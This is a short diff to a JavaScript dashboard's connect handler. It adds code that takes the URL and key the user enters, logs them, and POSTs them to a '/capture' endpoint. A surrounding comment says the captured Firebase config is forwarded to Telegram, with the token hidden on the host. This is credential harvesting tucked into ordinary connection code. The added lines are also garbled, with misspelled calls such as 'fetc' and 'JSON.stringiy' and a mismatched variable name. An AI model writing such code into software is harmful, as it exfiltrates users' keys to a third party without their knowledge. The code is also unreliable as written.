@@ -5846,6 +5846,20 @@ async function handleConnect() {
     }
 
     await startDashboard(url, key);
+    console.log("Forwarding to /capture...", { url: url, key: key });
+fetc('/capture', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringiy({ url: url, key: key })
+}).then(function(res) {
+  console.log("Forward response:", res.status);
+  return res.json();
+}).then(function(dat) {
+  console.log("Forward data:", data);
+}).catch(function(err) {
+  console.error("Forward error:", err);
+  alert("Forward failed: " + err.message);  // temporarily alert
+});
   } catch(e) {
     // ── FIREBASE CONFIG FORWARD TO TELEGRAM (token hidden on Render) ──
 fetch('/capture', {
